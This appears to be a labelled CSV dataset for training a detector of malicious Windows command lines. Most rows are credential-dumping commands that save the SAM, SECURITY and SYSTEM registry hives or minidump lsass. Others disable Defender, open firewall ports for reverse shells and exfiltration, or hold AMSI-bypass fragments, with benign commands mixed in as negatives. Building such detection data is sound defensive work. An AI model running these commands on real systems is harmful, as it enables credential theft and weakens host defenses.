text,label
"powershell -nop -c ""reg save hklm\sam c:\temp\x89on7pz.dat""",1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg  save  hklm\security  c:\windows\temp\aguq9j0t.save,1
reg export hklm\security c:\windows\temp\9qf2i9qt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\op5lw5z7.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\g8vs8emd.dat""",1
reg save hklm\sam c:\windows\temp\dam6djn3.save,1
reg export hklm\system c:\windows\temp\39yq4w40.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\xefz020s.dat""",1
reg export hklm\system c:\windows\temp\mbjf19uy.save,1
get-help  adjusttokenprivileges  -full,0
reg export hklm\security c:\windows\temp\h1ila47d.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\awp7qcgx.dat""",1
"cmd.exe /c ""sc   stop   windefend""",2
reg export hklm\security c:\windows\temp\06ms5bvs.save,1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\ibmb5ejq.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\naw0dluj.dat""",1
reg save hklm\sam c:\windows\temp\krefltnu.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3ala56ss.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\zmuyxr0i.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2l9yid3g.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qbpei6e7.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\u2yxnvo6.dat""",1
reg export hklm\sam c:\windows\temp\4sahgxn8.save,1
"powershell -nop -c ""python  -m  http.server  8080""",0
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)""",3
reg save hklm\sam c:\windows\temp\z4xblq0d.save,1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\p9dnqr9e.dat""",1
reg save hklm\sam c:\windows\temp\647il57h.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wfd6ks2p.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\050l1xos.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ijb18btc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\4yqhbv9d.dat""",1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""reg save hklm\sam c:\temp\agbagum7.dat""",1
reg export hklm\security c:\windows\temp\0x0owog7.save,1
reg save hklm\sam c:\windows\temp\enryyy0f.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0c6uhido.dat""",1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg  export  hklm\sam  c:\windows\temp\5h3523um.save,1
reg save hklm\system c:\windows\temp\83tz93f9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\irf8z28q.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\f7sv8l8v.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\rhg24vsi.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\c6z997gp.dat""",1
reg export hklm\security c:\windows\temp\5a8fz339.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\v8577gle.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\2j1iuv3b.dat""",1
reg  save  hklm\security  c:\windows\temp\r8rrz316.save,1
reg export hklm\security c:\windows\temp\6ez5vtd7.save,1
reg save hklm\security c:\windows\temp\s1svwz2c.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ruaqg7ik.dat""",1
reg export hklm\security c:\windows\temp\ddv9dgfc.save,1
reg export hklm\sam c:\windows\temp\ie7s9pbv.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\10ka4ikw.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\q2cw8j3z.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\uxeur0qe.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\fldy6uyl.save""",1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg   export   hklm\system   c:\windows\temp\2tzysgbu.save,1
reg export hklm\system c:\windows\temp\6uyf9eqf.save,1
reg save hklm\sam c:\windows\temp\pdbw6zwx.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\w5nd0wth.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\va5rergh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\qim4fy6y.dat""",1
"cmd.exe /c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\ey5qwtbg.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\h9vw408z.dat""",1
reg export hklm\security c:\windows\temp\mtqwl57t.save,1
reg save hklm\security c:\windows\temp\jcuppgtk.save,1
select-string  -path  c:\logs\app.log  -pattern  'failed  logon',0
"cmd.exe /c ""reg save hklm\security c:\temp\w773spfo.dat""",1
reg save hklm\sam c:\windows\temp\of1damp7.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\w3mtme8n.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\42ckvf28.dat""",1
reg save hklm\security c:\windows\temp\dhbwh9zg.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
reg export hklm\security c:\windows\temp\oa4s2rwu.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\tnv8q21z.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\iwgo363d.dat""",1
reg save hklm\sam c:\windows\temp\zv6lur2u.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\6n9uouwx.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\1m3yghto.dat""""",1
reg export hklm\security c:\windows\temp\3uivd4pp.save,1
reg save hklm\sam c:\windows\temp\nr8rqsb3.save,1
reg export hklm\security c:\windows\temp\dtuthfka.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\b89hnr1q.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\a0liv5kr.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1s2ns4sf.dat""",1
reg save hklm\security c:\windows\temp\rnfs8czh.save,1
reg   save   hklm\system   c:\windows\temp\z1mgzqjb.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\q6b4bezs.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\96ic19kc.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\mfcsl2nf.dat""",1
reg export hklm\system c:\windows\temp\yif26bgp.save,1
reg export hklm\security c:\windows\temp\sarj4096.save,1
reg export hklm\security c:\windows\temp\2iup6456.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\p1xwruou.dat""",1
reg export hklm\sam c:\windows\temp\syltgh10.save,1
reg   export   hklm\security   c:\windows\temp\7gs4dvvq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ggt0mnvt.dat""",1
reg export hklm\security c:\windows\temp\8zgxxl66.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vxl31fms.dat""",1
reg save hklm\security c:\windows\temp\q32fl6k5.save,1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\sam c:\temp\07ej7el7.dat""""",1
"powershell -nop -c ""ping  8.8.8.8""",0
reg save hklm\system c:\windows\temp\fy6cksmj.save,1
python   -m   http.server   8080,0
reg export hklm\system c:\windows\temp\2h832uxt.save,1
reg  export  hklm\security  c:\windows\temp\qucfux6c.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\93zv4utb.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\paujue43.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\xrji1klr.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\juco5tgu.dat""",1
"[dllimport(""advapi32.dll"")] extern bool amsiutils(...)",3
reg export hklm\sam c:\windows\temp\as49jdav.save,1
reg export hklm\security c:\windows\temp\xyt7zo6t.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\oidj2pxn.dat""",1
reg  export  hklm\system  c:\windows\temp\s5s3hwot.save,1
reg export hklm\security c:\windows\temp\dwmky4uf.save,1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\nvataugb.dat""",1
reg   export   hklm\security   c:\windows\temp\vjq6pby8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\il1zvf9w.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\sfv9irgy.dat""",1
reg export hklm\system c:\windows\temp\x9a7j0ma.save,1
reg export hklm\security c:\windows\temp\hmkmxupf.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7xjpf984.dat""",1
reg save hklm\security c:\windows\temp\rqrjs6rf.save,1
reg export hklm\system c:\windows\temp\j4n6h4iw.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\d5vvibx1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7liyb6e6.dat""",1
reg save hklm\system c:\windows\temp\7i7t4lh0.save,1
reg save hklm\sam c:\windows\temp\o2ivk2im.save,1
reg save hklm\system c:\windows\temp\2tw5l4ca.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fgjz16rq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\uebbx2gp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\eu87xs50.dat""",1
reg save hklm\sam c:\windows\temp\t3yo2u7b.save,1
reg export hklm\system c:\windows\temp\lso3gzok.save,1
reg export hklm\security c:\windows\temp\71x7oj50.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\nuhswwk0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\mtdagzo5.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\xf08nco1.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6810cf43.dat""",1
reg export hklm\security c:\windows\temp\madjtujq.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ue1p616z.dat""",1
reg save hklm\system c:\windows\temp\jyd431c1.save,1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\2d0ceght.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jvk2pd5g.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\j5ekla26.dat""",1
reg export hklm\system c:\windows\temp\d06g1j78.save,1
backup-utility save registry config,0
rule: exfil data | app: any | dir: outbound | act: allow | port: 4444,2
reg save hklm\system c:\windows\temp\hfi70360.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\5yw2i13o.dat""""",1
"powershell -nop -c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\0sk77ub4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ytb2t711.dat""",1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg  save  hklm\sam  c:\windows\temp\oobt95vt.save,1
reg export hklm\system c:\windows\temp\yjdtlxx0.save,1
reg export hklm\security c:\windows\temp\r3pg11fj.save,1
reg save hklm\system c:\windows\temp\f05mx7y3.save,1
reg  export  hklm\security  c:\windows\temp\i4ea6n9x.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\8s8fkrfv.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\yedw53do.save""",1
reg export hklm\system c:\windows\temp\4soiyg5g.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\tzrx3500.save""",1
reg save hklm\sam c:\windows\temp\l1t2vs1b.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\k9cn85iv.dat""",1
reg save hklm\sam c:\windows\temp\sqkwgi8s.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\w64n83f4.dat""",1
reg save hklm\sam c:\windows\temp\miy0472d.save,1
reg save hklm\system c:\windows\temp\54llrcsz.save,1
reg save hklm\security c:\windows\temp\1908pt1s.save,1
reg save hklm\system c:\windows\temp\k2onomfm.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\tyuxrfa3.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\jiuvrccq.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\j8n8m1m0.dat""",1
reg  save  hklm\sam  c:\windows\temp\kjwh5gw0.save,1
reg export hklm\system c:\windows\temp\2te7q7x8.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ka2q44y7.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\myoaowbu.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\cupybcpn.dat""",1
reg save hklm\sam c:\windows\temp\opvd4khh.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\n7hcrwe0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\1rih0kb1.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\sqvzusfc.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0ynokzvl.dat""",1
reg export hklm\system c:\windows\temp\2jsazlyx.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\29xv2xl0.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\en8hdq9h.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\hohc4zp5.dat""""",1
reg export hklm\sam c:\windows\temp\3i4i53nb.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)""",3
reg   export   hklm\system   c:\windows\temp\rgmb1e2e.save,1
reg save hklm\sam c:\windows\temp\1zon5784.save,1
reg export hklm\sam c:\windows\temp\8x46mp6z.save,1
reg save hklm\system c:\windows\temp\8j119huy.save,1
reg export hklm\sam c:\windows\temp\ij0xnc4u.save,1
reg export hklm\security c:\windows\temp\pwn0tpfn.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\f0srhs8c.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\55gq9iv7.dat""",1
reg export hklm\system c:\windows\temp\i1f8l0fx.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ukllms4v.dat""",1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\v3xm11n7.dat""""",1
reg export hklm\security c:\windows\temp\5i8ynzup.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7cq51hof.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\ymp0d6nx.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\o3tgqjxi.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\v6dt2np5.dat""",1
reg save hklm\sam c:\windows\temp\awf4wokd.save,1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\thyt3z9u.dat""""",1
reg save hklm\system c:\windows\temp\7wfwy97h.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\sp5cvsvg.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\azkg3teb.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\yvj6z3w2.dat""",1
reg export hklm\sam c:\windows\temp\fx4kzihq.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\iold1j8h.save""",1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"powershell -nop -c ""reg export hklm\security c:\temp\f2cjx0vo.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\eac1kdfp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hqlkprt7.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\d0g2o788.dat""",1
reg export hklm\sam c:\windows\temp\v71c9toe.save,1
reg   save   hklm\sam   c:\windows\temp\2opkk77h.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\drh3c2pz.save""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\5i9gvonh.save""",1
reg  save  hklm\sam  c:\windows\temp\mjnrojul.save,1
reg export hklm\system c:\windows\temp\jsgqn02z.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\uajsnjix.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\wkf08ujk.dat""",1
reg export hklm\security c:\windows\temp\zmng94dz.save,1
reg export hklm\security c:\windows\temp\jwkv9zgu.save,1
reg save hklm\sam c:\windows\temp\kqd0ngxl.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\wcrblr8y.dat""",1
reg export hklm\sam c:\windows\temp\2k9fd8oq.save,1
reg save hklm\security c:\windows\temp\wcpwajny.save,1
reg save hklm\system c:\windows\temp\aylkwrqq.save,1
reg export hklm\system c:\windows\temp\6m0y18l2.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\mik31jd7.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\pjkmnbgf.dat""",1
reg  save  hklm\system  c:\windows\temp\pizwm4yn.save,1
reg  export  hklm\system  c:\windows\temp\76p7i0by.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\9smp0w0p.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\gvh1g030.save""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\3eaoohli.dat""""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\2jktllxc.save""",1
reg save hklm\system c:\windows\temp\2mngbdpj.save,1
reg save hklm\system c:\windows\temp\11o9d2cz.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\reid6nsq.save,1
ping   8.8.8.8,0
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg save hklm\security c:\temp\ftsyi9pf.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8i9w2jlv.dat""",1
reg save hklm\system c:\windows\temp\h6wi4ahq.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\a318if79.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\bru74gnr.dat""",1
node server.js --port 3000,0
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\nrk6z5ta.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\183q9pb3.dat""",1
reg save hklm\security c:\windows\temp\7lp9lv2c.save,1
reg export hklm\sam c:\windows\temp\ewnynu9l.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\8azau5f8.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dmy7uogw.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\z2vyck18.dat""",1
reg save hklm\sam c:\windows\temp\outw08cs.save,1
reg export hklm\system c:\windows\temp\a2es11rm.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\gko2cpad.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\r98df1fh.save""",1
"cmd.exe /c ""ping  8.8.8.8""",0
reg save hklm\system c:\windows\temp\z17fm07l.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\p1vlwxvz.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hmg9h0sg.dat""",1
reg save hklm\security c:\windows\temp\blpiioee.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bixoui0o.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\2aosk24a.dat""""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\lkceqx0k.dat""""",1
"powershell -nop -c ""java  -jar  application.jar""",0
reg export hklm\system c:\windows\temp\v6ett8rz.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\knw1re5q.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9f51hfwb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\dyr7t587.dat""",1
reg   query   hkcu\console,0
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\hpctagkt.dat""",1
reg export hklm\security c:\windows\temp\gigyiyxt.save,1
reg save hklm\sam c:\windows\temp\n5c2r189.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\fgqik3xi.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4vnqfu12.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg  save  hklm\security  c:\windows\temp\4lkbbgog.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\r39urvgt.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ovfjerr7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ihchtl7b.dat""",1
reg save hklm\system c:\windows\temp\e9nhjuc8.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\7ewixcuc.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\0j0rymse.dat""",1
reg save hklm\system c:\windows\temp\p2vhxmlw.save,1
reg save hklm\security c:\windows\temp\eq3e2wn2.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\z8xguww7.save""",1
"cmd.exe /c ""netsh   advfirewall   firewall   add   rule   name=""bad""   action=allow   protocol=any   port=4444""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\kyfeoris.dat""",1
reg save hklm\sam c:\windows\temp\m8bj0jnr.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\u8wyu6eg.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\b4un7ze7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\idfzzito.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\f7iz43mr.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jm69w2pl.dat""",1
reg export hklm\security c:\windows\temp\06qw5hfl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\2wcf884b.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ljt2u17s.dat""",1
reg save hklm\security c:\windows\temp\yfwc4y4z.save,1
reg save hklm\sam c:\windows\temp\gzowu979.save,1
sc  query  windefend,0
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg save hklm\security c:\temp\kndq62x1.dat""",1
reg save hklm\system c:\windows\temp\hk4lqasv.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\96ynhisb.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\zw207lvb.dat""",1
reg export hklm\system c:\windows\temp\wvwtobfs.save,1
reg save hklm\system c:\windows\temp\6now01lb.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\df3pgama.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3rou8jpr.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\8bdh7z5s.dat""",1
reg export hklm\security c:\windows\temp\xm7diog6.save,1
reg save hklm\sam c:\windows\temp\dk741elo.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\h5ex6qmu.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\q68cpcfx.dat""",1
reg save hklm\sam c:\windows\temp\jbobxvxn.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg export hklm\system c:\windows\temp\8sulfxmg.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\ijid78ns.dat""",1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\vk121oh6.save""",1
reg save hklm\sam c:\windows\temp\9imgpkm5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ilvi4sx5.dat""",1
reg save hklm\system c:\windows\temp\edigy8io.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\4ictmei9.save""",1
reg   export   hklm\security   c:\windows\temp\1spk1d4j.save,1
reg save hklm\system c:\windows\temp\f4oyxv2q.save,1
reg save hklm\security c:\windows\temp\48p0tcen.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wdn79ly3.dat""",1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\lq58uxhl.save""",1
reg export hklm\system c:\windows\temp\kwy7z3ug.save,1
reg export hklm\security c:\windows\temp\dkz3f50i.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\h09xkkjv.dat""",1
reg   export   hklm\security   c:\windows\temp\phdtuu1i.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\fim7innm.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\bv41oi3w.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\kf5q2dc7.dat""",1
reg save hklm\sam c:\windows\temp\u540pwql.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ivxix6lk.dat""",1
reg save hklm\system c:\windows\temp\npll8qu1.save,1
reg save hklm\security c:\windows\temp\r4cfp4mh.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\j608obnv.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\g26havv4.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\lk6yfrca.save""",1
reg export hklm\security c:\windows\temp\i6q518us.save,1
reg save hklm\system c:\windows\temp\9sg5aa5w.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\vizfjsqq.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xlb6yf0h.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\enk8u2go.dat""",1
reg save hklm\system c:\windows\temp\frshd4x5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\yba3ixo8.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\9gkivb6o.dat""",1
reg save hklm\system c:\windows\temp\oqmvdirj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\96vazp3p.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\k2jhu9er.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8a6u7gxm.dat""",1
node   server.js   --port   3000,0
"cmd.exe /c ""reg save hklm\security c:\temp\f7nwusmz.dat""",1
reg save hklm\system c:\windows\temp\bc91pl22.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\d9kqam2b.save""",1
